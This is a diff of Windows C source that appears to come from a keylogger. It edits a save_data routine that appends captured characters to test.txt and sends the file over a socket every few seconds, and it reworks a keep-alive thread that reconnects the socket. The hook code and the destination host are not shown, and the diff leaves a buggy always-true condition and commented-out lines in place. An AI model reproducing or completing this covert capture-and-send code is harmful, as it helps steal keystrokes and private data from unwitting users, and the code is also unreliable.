@@ -165,9 +165,10 @@ void	save_data(const char *data)
 	time(&timet2);
 	if (timet1 != 0)
 		elapseTime = difftime(timet2, timet1);
-	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
+	if ((file = _wfsopen(L"test.txt", L"a+", _SH_DENYNO)) == NULL)
 		_wperror(L" Open file failed ");
-	_write(_fileno(file), data, (unsigned int)strlen(data));
+	if (my_sock != SOCKET_ERROR || my_sock != INVALID_SOCKET)
+		_write(_fileno(file), data, (unsigned int)strlen(data));
 	countTime = countTime + elapseTime;
 	if (nbChar > 59)
 	{
@@ -175,20 +176,20 @@ void	save_data(const char *data)
 			_wperror(L" Add \\n at the end of the file failed ");
 		nbChar = 0;
 	}
-	if (my_sock != SOCKET_ERROR)
+	if (my_sock != SOCKET_ERROR && my_sock != INVALID_SOCKET)
 	{
 		if (countTime > 5)
 		{
 			countTime = 0;
-			send_data(my_sock, file);
-			if (fclose(file) != 0)
-				_wperror(L"Close file failed");
-			if (_wfopen_s(&file, L"test.txt", L"w+") != 0)
-				_wperror(L" Open file failed ");
+			send_data(&my_sock, file);
+		//	if (fclose(file) != 0)
+			//	_wperror(L"Close file failed");
+			//if (_wfopen_s(&file, L"test.txt", L"w+") != 0)
+		//		_wperror(L" Open file failed ");
 		}
-		if (fclose(file) != 0)
-			_wperror(L" Close file failed ");
 	}
+	if (fclose(file) != 0)
+		_wperror(L" Close file failed ");
 	timet1 = timet2;
 	nbChar++;
 }
@@ -199,23 +200,22 @@ void server(SOCKET *server_sock)
 	return;
 }
 
-void keep_alive_client_and_init(SOCKET *keepalive_sock)
+void keep_alive_client_and_init(void)
 {
-	printf("normalement je devrais bien etre dans la fonction\n");
-	while (((my_sock = init_socket(&my_sock)) == INVALID_SOCKET) || (my_sock == SOCKET_ERROR))
+	char buf[10];
+	int size = (int)sizeof(buf);
+	if (init_socket(&my_sock) == SOCKET_ERROR || my_sock == INVALID_SOCKET)
+		return;
+	if (setsockopt(my_sock, SOL_SOCKET, SO_KEEPALIVE, buf, size) == SOCKET_ERROR)
+		return;
+	while (1)
 	{
-		if (my_sock == INVALID_SOCKET)
-			printf("invalid socket\n");
-		printf("je suis encore dans la boucle init\n");
+		if (my_sock == INVALID_SOCKET || my_sock == SOCKET_ERROR)
+		{
+			init_socket(&my_sock);
+		}
 		Sleep(1000);
 	}
-
-	if (init_socket(keepalive_sock) == SOCKET_ERROR)
-		return;
-	else
-		if (setsockopt(*keepalive_sock, SOL_SOCKET, SO_KEEPALIVE, "10", sizeof("10")) == SOCKET_ERROR)
-			return;
-	while (1);
 	return;
 }
 
@@ -225,11 +225,10 @@ int	main(void)
 	WSADATA wsadata;
 	HANDLE thread_keepalive;
 	HANDLE thread_server;
-	SOCKET keepalive_sock;
 	SOCKET server_sock;
 
 	WSAStartup(MAKEWORD(2, 0), &wsadata);
-	if ((thread_keepalive = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keep_alive_client_and_init, &keepalive_sock, 0, NULL)) == NULL)
+	if ((thread_keepalive = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keep_alive_client_and_init, NULL, 0, NULL)) == NULL)
 		return (-1);
 	if ((thread_server = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)server, &server_sock, 0, NULL)) == NULL)
 		return (-1);
@@ -251,7 +250,6 @@ int	main(void)
 		return (-1);
 	}
 	closesocket(my_sock);
-	closesocket(keepalive_sock);
 	TerminateThread(thread_keepalive, 0);
 	WSACleanup();
 	return (msg.wParam);
